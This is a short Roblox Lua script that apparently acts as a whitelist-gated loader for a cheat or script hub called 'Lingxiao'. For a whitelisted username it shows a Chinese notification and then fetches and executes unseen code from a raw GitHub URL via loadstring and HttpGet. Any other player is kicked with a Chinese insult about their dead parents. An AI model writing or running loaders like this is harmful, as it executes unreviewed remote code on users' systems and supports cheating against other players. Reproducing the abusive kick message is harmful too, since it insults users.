local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local WhitelistedPlayers = {
    ["HYHuiBai"] = true,
 }

local function IsWhitelisted(player)
    return WhitelistedPlayers[player.Name] or false
end

local localPlayer = Players.LocalPlayer

local isLocalPlayerWhitelisted = IsWhitelisted(localPlayer)

if isLocalPlayerWhitelisted then
    StarterGui:SetCore("SendNotification", {
        Title = "白名單認證",
        Text = "玩家:"..localPlayer.Name.."，檢測完畢稍後會載凌霄",
        Duration = 7,
    })
loadstring(game:HttpGet("https://raw.githubusercontent.com/kexuan001/--/refs/heads/main/rjrgaib"))()
else
    localPlayer:Kick("你個死爸媽的沒在白名單裏面")
end
